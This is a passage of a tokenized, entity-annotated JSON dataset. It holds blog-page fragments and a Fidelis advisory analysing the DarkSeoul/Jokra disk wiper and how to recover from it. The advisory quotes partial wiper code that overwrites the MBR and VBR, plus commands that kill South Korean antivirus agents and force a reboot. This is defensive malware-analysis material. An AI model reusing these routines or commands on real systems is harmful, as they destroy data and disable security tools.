"Nov"], ["Got", "my", "sweet", "new", "@CrowdStrike", "Dead", "Eye", "Jackal", "shirt", "today", "#DFIR", "#malware"], ["#deadeyejackal", "pic", ".", "twitter.com/mihenWdbAa"], ["Retweeted", "by", "CrowdStrike"], ["Compose", "new", "Tweet\u2026"], ["Recent", "Posts"], ["The", "Imperative", "for", "Proactive", "Incident", "Response", "in", "2015", "and", "Beyond"], ["November", "3", ",", "2015"], ["Why", "Your", "Business", "Environment", "Should", "Drive", "Cybersecurity"], ["November", "2", ",", "2015"], ["Blurring", "of", "Commodity", "and", "Targeted", "Attack", "Malware"], ["October", "16", ",", "2015"], ["Should", "I", "Really", "Trust", "the", "Cloud", "with", "my", "Endpoint", "Protection", "?"], ["September", "30", ",", "2015"], ["U", ".", "S.", "\u2013", "China", "Agreement", "on", "Cyber", "Intrusions:", "An", "In\ufb02ection", "Point"], ["September", "25", ",", "2015"], ["Archives"], ["N"], ["M"], ["T"], ["W"], ["O"], ["V"], ["T"], ["E"], ["M"], ["B"], ["E"], ["F"], ["R"], ["2"], ["S"], ["0"], ["1"], ["5"], ["S"], ["1"], ["2"], ["3"], ["4"], ["5"], ["6"], ["7"], ["8"], ["9"], ["10"], ["11"], ["12"], ["13"], ["14"], ["15"], ["16"], ["17"], ["18"], ["19"], ["20"], ["21"], ["22"], ["23"], ["24"], ["25"], ["26"], ["27"], ["28"], ["29"], ["30"], ["\u00ab", "Oct"], ["Recent", "Comments"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Darkseoul", "sent_id": 5, "pos": []}, {"old_id": "T2", "type": "Malware", "name": "Jokra", "sent_id": 5, "pos": []}, {"old_id": "T3", "type": "Time", "name": "March 21 2013", "sent_id": 6, "pos": [0, 3]}, {"old_id": "T4", "type": "Organization", "name": "Fidelis", "sent_id": 4, "pos": [0]}, {"old_id": "T5", "type": "ExploitTargetObject", "name": "South Korean broadcasting and banking infrastructure", "sent_id": 11, "pos": [6, 11]}, {"old_id": "T6", "type": "ExploitTargetObject", "name": "Saudi Aramco", "sent_id": 13, "pos": [7, 8]}, {"old_id": "T7", "type": "Malware", "name": "Shamoon", "sent_id": 13, "pos": [11]}, {"old_id": "T8", "type": "Malware", "name": "Shamoon", "sent_id": 13, "pos": [11]}, {"old_id": "T9", "type": "Indicator", "name": "HASTATI", "sent_id": 22, "pos": []}, {"old_id": "T10", "type": "Indicator", "name": "PRNCPES", "sent_id": 22, "pos": []}, {"old_id": "T11", "type": "Malware", "name": "Shamoon", "sent_id": 24, "pos": [2]}, {"old_id": "T12", "type": "Malware", "name": "DarkSeoul", "sent_id": 28, "pos": []}, {"old_id": "T13", "type": "Malware", "name": "Jokra", "sent_id": 28, "pos": []}, {"old_id": "T14", "type": "Malware", "name": "239ed75323exe", "sent_id": 31, "pos": []}, {"old_id": "T15", "type": "Malware", "name": "mb_joinexe", "sent_id": 32, "pos": []}, {"old_id": "T16", "type": "MD5", "name": "5fcd6e1dace6b0599429d913850f0364", "sent_id": 33, "pos": [0]}, {"old_id": "T17", "type": "MD5", "name": "0a8032cd6b4a710b1771a080fa09fb87", "sent_id": 34, "pos": [0]}, {"old_id": "T18", "type": "System", "name": "Windows XP", "sent_id": 57, "pos": [6, 7]}, {"old_id": "T19", "type": "Indicator", "name": "taskkill /F /IM pasvcexe", "sent_id": 104, "pos": []}, {"old_id": "T20", "type": "Indicator", "name": "taskkill /F /IM Clisvcexe", "sent_id": 105, "pos": []}, {"old_id": "T21", "type": "Indicator", "name": "shutdown -r -t 0", "sent_id": 106, "pos": []}, {"old_id": "T22", "type": "Software", "name": "ViRobot ISMS", "sent_id": 120, "pos": [6, 7]}, {"old_id": "T23", "type": "Organization", "name": "HAURI Inc", "sent_id": 120, "pos": [11, 12]}, {"old_id": "T24", "type": "Malware", "name": "Shamoon", "sent_id": 136, "pos": [5]}, {"old_id": "T25", "type": "Software", "name": "Fidelis XPS", "sent_id": 170, "pos": [0, 1]}, {"old_id": "T26", "type": "Malware", "name": "DarkSeoul", "sent_id": 170, "pos": []}, {"old_id": "T27", "type": "Malware", "name": "Jokra", "sent_id": 170, "pos": []}, {"old_id": "T28", "type": "TrojanHorse", "name": "TrojanWin32EraseMBRb", "sent_id": 171, "pos": []}], "labels": [{"old_id": "R2", "r": "P21", "h": 8, "t": 11, "evidence": [22, 23, 24, 25, 26, 27, 28]}, {"old_id": "R3", "r": "P21", "h": 9, "t": 12, "evidence": [22, 23, 24, 25, 26, 27, 28]}, {"old_id": "R1", "r": "P21", "h": 15, "t": 13, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 16, "t": 14, "evidence": []}, {"old_id": "R5", "r": "P17", "h": 22, "t": 21, "evidence": [120]}], "title": ["inputs/txt/201303FidelisDarkSeoulJokra"], "sents": [["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["Fidelis", "Threat", "Advisory", "#1008"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["March", "21", ",", "2013"], ["Document", "Status:"], ["Last", "Revised:"], ["FINAL"], ["2013-03-21"], ["A", "recent", "cyber-attack", "reported", "within", "the", "South", "Korean", "broadcasting", "and", "banking", "infrastructure"], ["reportedly", "brought", "down", "over", "35", ",", "000", "systems", ".", "This", "attack", "has", "drawn", "comparisons", "in", "intent", "and"], ["method", "to", "the", "recent", "wiping", "attack", "against", "Saudi", "Aramco", "by", "the", "Shamoon", "malware", ".", "Shamoon"], ["has", "been", "covered", "extensively", "by", "the", "community", ",", "and", "was", "covered", "in", "Fidelis", "Threat", "Advisory"], ["#1007", ".", "Naturally", "our", "curiosity", "was", "peaked", "and", "we", "acquired", "samples", "of", "the", "malware", "and", "started"], ["analysis", "."], ["The", "initial", "analysis", "has", "been", "posted", "on", "the", "Fidelis", "Threat", "Geek", "blog", "and", "will", "be", "expanded", "upon"], ["in", "this", "advisory", ".", "This", "write-up", "will", "focus", "on", "the", "wiper", "malware", "used", "and", "the", "recovery", "techniques"], ["that", "are", "possible", "."], ["From", "preliminary", "analysis", "it", "is", "known", "that", "the", "malware", "will", "overwrite", "the", "Master", "Boot", "Record"], ["(MBR)", "and", "Volume", "Boot", "Record", "(VBR)", ".", "The", "records", "and", "files", "overwritten", "by", "the", "malware", "so", "far"], ["have", "been", "wiped", "with", "patterns", "of", "'HASTATI'", "or", "'PR!NCPES\u2019", "."], ["The", "malware", "samples", "that", "have", "been", "analyzed", "by", "our", "team", "are", "different", "in", "code", "and", "function"], ["from", "the", "Shamoon", "malware", ".", "However", ",", "by", "using", "the", "same", "recovery", "methods", "found", "in", "advisory"], ["#1007", "the", "files", "and", "data", "are", "indeed", "recoverable", "."], ["Wiper", "Malware", "Overview"], ["Two", "malware", "samples", "obtained", "were", "used", "in", "the", "analysis", ".", "The", "malware", "has", "been", "named"], ["'DarkSeoul'", "and", "'Jokra'", "by", "the", "community", "."], ["Our", "samples", "have", "been", "touched", "on", "in", "our", "blog", "entry", "and", "other", "samples", "have", "been", "covered", "in"], ["blogs", "around", "the", "community", "."], ["239ed75323", ".", "exe:"], ["mb_join", ".", "exe:"], ["5fcd6e1dace6b0599429d913850f0364"], ["0a8032cd6b4a710b1771a080fa09fb87"], ["Users", "are", "granted", "permission", "to", "copy", "and/or", "distribute", "this", "document", "in", "its", "original", "electronic", "form", "and", "print", "copies", "for", "personal", "use", ".", "This"], ["document", "cannot", "be", "modified", "or", "converted", "to", "any", "other", "electronic", "or", "machine-readable", "form", "in", "whole", "or", "in", "part", "without", "prior", "written"], ["approval", "of", "Fidelis", "Security", "Systems", ",", "Inc", "."], ["While", "we", "have", "done", "our", "best", "to", "ensure", "that", "the", "material", "found", "in", "this", "document", "is", "accurate", ",", "Fidelis", "Security", "Systems", ",", "Inc", ".", "makes", "no"], ["guarantee", "that", "the", "information", "contained", "herein", "is", "error", "free", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "1", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["The", "malware", "gains", "disk", "access", "by", "opening", "the", "physical", "drive", "as", "a", "file", "."], ["Disk", "Access", "(Func", "00401d55):"], ["sprintf(filename_str", ",", "\"\\\\", ".", "\\PhysicalDrive%d\",", "0)"], ["hFile", "=", "CreateFileA(filename_str", ",", "GENERIC_READ", "|", "GENERIC_WRITE", ","], ["FILE_SHARE_READ", "|", "FILE_SHARE_WRITE", ",", "NULL", ","], ["OPEN_EXISTING", ",", "NULL)"], ["Example", "of", "the", "wiper", "opening", "the", "drive", "as", "a", "file", "."], ["The", "first", "section", "that", "the", "malware", "overwrites", "is", "located", "at", "0x7000", ".", "This", "is", "sector", "56", "and", "is"], ["normally", "the", "VBR", "location", "of", "a", "Windows", "XP", "system", ".", "It", "continues", "the", "pattern", "of", "'HASTATI'", "or"], ["'PR", "!", "NCPES\u2019'", "for", "102", ",", "400d", "bytes", "."], ["Wiper", "Selection", "(Func", "00402079):"], ["and", "[local", ".", "1],", "0"], [";(local", ".", "1->\"PR!NCPES\")"], ["mov", "esi,[arg", ".", "2]", ";arg", ".", "2", "=", "0x38", "on", "first", "call"], ["eax=0"], ["shld", "eax", ",", "esi,9"], ["mov", "edi,[arg", ".", "1]"], ["mov", "[arg", ".", "2],", "eax"], ["lea", "eax", ",", "[arg", ".", "2]"], ["shl", "esi", ",", "9"], ["SetFilePointer(hFile", ",", "esi", ",", "eax", ",", "FILE_BEGIN)", "//", "on", "first", "call", "--", "0x009efab8:0x00007000"], ["WriteFile(hFile", ",", "&arg", ".", "3,", "512", ",", "&local", ".", "1,", "NULL)"], ["Example", "of", "how", "the", "wiper", "selected", "the", "location", "to", "overwrite", "on", "the", "first", "call", "."], ["If", "this", "is", "hardcoded", "for", "0x7000", "then", "it", "will", "not", "wipe", "the", "VBR", "of", "any", "systems", "after", "and", "including"], ["Vista", ",", "as", "those", "VBR", "locations", "are", "in", "different", "areas", "."], ["During", "testing", "both", "malware", "samples", "were", "executed", "in", "a", "Windows", "7", "VM", ".", "Neither", "wiped", "the", "MBR"], ["or", "the", "VBR\u2014they", "only", "overwrote", "files", "within", "the", "file", "system\u2014but", "the", "system", "wasn't", "prevented"], ["from", "starting", "up", "."], ["The", "malware", "writes", "a", "512-byte", "pattern", "to", "the", "disk", "in", "XP", "and", "a", "1023", "byte", "pattern", "in", "Windows", "7", "."], ["Example", "of", "the", "loop", "responsible", "for", "overwriting", "the", "disk", "and", "files", "."], ["As", "observed", "during", "a", "debugging", "session", "the", "following", "screenshot", "shows", "one", "of", "the", "512-byte"], ["patterns", "it", "writes", "to", "disk:"], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "2", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["Example", "of", "overwritten", "disk"], ["The", "malware", "will", "create", "new", "threads", "for", "each", "physical", "drive", "found", "on", "the", "affected", "system", ".", "It"], ["enumerates", "and", "tries", "to", "find", "PhysicalDrive[0-9]", ".", "The", "malware", "makes", "distinctions", "based", "on", "what"], ["type", "of", "drive", "is", "detected", ",", "such", "as", "fixed", "or", "removable", "devices", ".", "As", "long", "as", "the", "drive", "is", "fixed", "a", "new"], ["thread", "is", "created", "."], ["Thread", "1", "(Func", "00401aa0):"], ["call", "func_00401d55"], ["strcpy(drive_path", ",", "\"B:\\\")"], ["", ".", ".."], ["if", "(GetDriveType(drive_path)", "==", "DRIVE_FIXED)"], ["CreateThread(NULL", ",", "0", ",", "00401B7A", ",", "0040247C", ",", "0", ",", "&tid)"], ["", ".", ".."], ["Example", "of", "the", "wiper", "finds", "fixed", "drives", "and", "create", "new", "thread", "for", "each", "drive", "."], ["The", "following", "commands", "have", "previously", "been", "reported", "in", "the", "community:"], ["\u201ctaskkill", "/F", "/IM", "pasvc", ".", "exe\u201d"], ["\u201ctaskkill", "/F", "/IM", "Clisvc", ".", "exe\u201d"], ["\"shutdown", "-r", "-t", "0\""], ["Example", "of", "commands", "run", "by", "the", "malware", "."], ["The", "first", "command", ",", "\u201ctaskkill", "/F", "/IM", "pasvc", ".", "exe\u201d,", "will", "try", "to", "kill", "a", "process", "named", "\u201cpasvc", ".", "exe\u201d.", "This"], ["process", "is", "associated", "with", "the", "AhnLab", "Policy", "Agent", "process", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "3", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["The", "second", "command", ",", "\u201ctaskkill", "/F", "/IM", "Clisvc", ".", "exe\u201d,", "will", "try", "to", "kill", "a", "process", "named", "\u201cClisvc", ".", "exe\u201d."], ["This", "process", "is", "associated", "with", "the", "ViRobot", "ISMS", "security", "tool", "from", "HAURI", "Inc", "."], ["The", "third", "command", ",", "\u201cshutdown", "-r", "-t", "0\u201d", ",", "instructs", "the", "malware", "to", "shutdown", "and", "reboot", "the", "system", "."], ["The", "malware", "shuts", "the", "system", "down", "quickly", "after", "initial", "execution", ",", "it", "was", "found", "to", "finish", "wiping", "in"], ["ten", "to", "fifteen", "minutes", "in", "our", "tests", ".", "Due", "to", "the", "speed", "of", "the", "wiping", "it", "was", "very", "easy", "to", "find", "that", "the"], ["malware", "did", "not", "actually", "wipe", "all", "the", "data", "on", "the", "computer", ".", "It", "wiped", "just", "enough", "to", "make", "the"], ["machine", "unusable", "after", "the", "operation", "was", "complete", ".", "This", "is", "notable", "and", "can", "be", "seen", "in", "the"], ["operation", "of", "the", "malware", "as", "it", "makes", "sure", "to", "overwrite", "the", "VBR", "first", "then", "continue", "overwriting", "the"], ["MBR", "and", "other", "files", "."], ["Note:", "The", "sample", "Fidelis", "Security", "Systems", "researchers", "had", "available", "looked", "very", "similar", "to", "that"], ["detailed", "in", "community", "write-ups", ".", "However", ",", "as", "of", "the", "date", "of", "this", "post", ",", "researchers", "were", "still"], ["analyzing", "the", "available", "sample", ".", "Therefore", ",", "differences", "between", "the", "available", "sample", "and", "others"], ["available", "to", "the", "community", "may", "become", "apparent", "in", "the", "future", "."], ["File", "System", "Recovery"], ["The", "following", "is", "the", "view", "of", "the", "wiped", "disk", "for", "each", "of", "the", "operating", "systems", "that", "we", "tested:"], ["Example", "of", "wiped", "MBR", "by", "the", "Malware", "."], ["The", "malware", "never", "actually", "overwrote", "the", "backup", "VBR", ".", "It", "was", "found", "that", "the", "same", "techniques"], ["utilized", "to", "recover", "data", "from", "Shamoon", "could", "be", "applied", "here", ".", "The", "recovery", "methods", "were"], ["covered", "in", "depth", "in", "Fidelis", "Threat", "Advisory", "#1007", "so", "we", "will", "not", "show", "them", "here", ".", "What", "will", "be"], ["shown", "are", "the", "results", "of", "the", "recovery", "."], ["When", "the", "backup", "VBR", "is", "found", "within", "EnCase", "(v6", ".", "19.6)", "it", "was", "possible", "to", "add", "a", "manual", "NTFS"], ["partition", "into", "the", "system", "to", "recover", "the", "file", "system", "and", "data", "within", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "4", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["Example", "of", "a", "file", "system", "recovered"], ["Once", "the", "logical", "file", "system", "is", "recovered", "relevant", "forensic", "artifacts", "can", "be", "located", ".", "It", "will", "be"], ["important", "to", "note", "that", "a", "lot", "of", "files", "will", "be", "recoverable", "and", "a", "lot", "of", "system", "files", "are", "left", "untouched", "."], ["The", "wiper", "corrupts", "file", "systems", "very", "quickly", ",", "but", "the", "expense", "of", "this", "is", "leaving", "more", "files"], ["untouched", "and", "recoverable", "."], ["Note:", "When", "multiple", "partitions", "are", "suspected", "then", "it", "will", "be", "likely", "the", "recovery", "will", "need", "to", "be"], ["done", "manually", "with", "a", "hex", "editor", ".", "The", "method", "for", "this", "was", "also", "covered", "in", "advisory", "#1007", "."], ["Using", "a", "hex", "editor", "it", "is", "possible", "to", "repair", "an", "image", "with", "the", "backup", "VBR", "and", "build", "a", "new", "MBR", "to"], ["boot", "the", "affected", "computer", ".", "This", "comes", "with", "a", "warning", ",", "just", "being", "able", "to", "boot", "the", "machine", "and"], ["accessing", "the", "data", "within", "doesn't", "mean", "that", "system", "will", "operate", "properly", ".", "The", "system", "still", "has"], ["files", "that", "were", "corrupted", "by", "the", "malware", ",", "and", "some", "of", "those", "files", "will", "affect", "the", "user", "experience", "."], ["However", ",", "in", "our", "testing", "we", "were", "able", "to", "rebuild", "the", "MBR", "and", "recover", "the", "VBR", "to", "boot", "the"], ["affected", "system", "."], ["Our", "repaired", "system", "was", "missing", "the", "start", "button", "and", "a", "few", "of", "the", "shortcuts", "to", "executables", "on"], ["the", "desktop", "were", "no", "longer", "functioning", ".", "The", "XP", "system", "when", "repaired", "always", "asked", "to", "complete"], ["a", "chkdisk", "cycle", ",", "and", "on", "the", "whole", "didn\u2019t", "operate", "normally", ".", "The", "Windows", "7", "systems", "that", "were"], ["affected", "by", "the", "two", "malware", "samples", "did", "not", "experience", "these", "issues", ",", "and", "appeared", "to", "operate"], ["normally", ".", "Attempts", "to", "repair", "the", "XP", "system", "with", "the", "windows", "recovery", "CD", "always", "ended", "in", "a"], ["bluescreen", "error", "before", "the", "operation", "finished", "any", "repairing", "."], ["The", "Fidelis", "Take"], ["Fidelis", "XPS", "sensors", "detect", "the", "DarkSeoul/Jokra", "malware", "as", "it", "enters", "the", "network", "as"], ["\"Trojan", ".", "Win32.EraseMBR.b\".", "Fidelis", "XPS", "is", "capable", "of", "detecting", "this", "threat", "regardless", "of", "delivery"], ["method", "employed", "by", "the", "Threat", "Actors", "responsible", ".", "Fidelis", "XPS", "can", "detect", "and", "alert", "on"], ["executables", "such", "as", "the", "DarkSeoul", "malware", "multiple", "layers", "deep", "inside", "of", "zip", "files", ",", "or", "even"], ["XOR'ed", "inside", "of", "a", "weaponized", "MS", "Office", "document", "or", "Adobe", "PDF", "File", ".", "The", "Fidelis", "Threat"], ["Research", "and", "Network", "Forensics", "and", "Incident", "Response", "teams", "will", "continue", "to", "actively", "monitor"], ["the", "ever-evolving", "threat", "landscape", "for", "the", "latest", "threats", "to", "our", "customers", "network", "security", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "5", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"]]}]]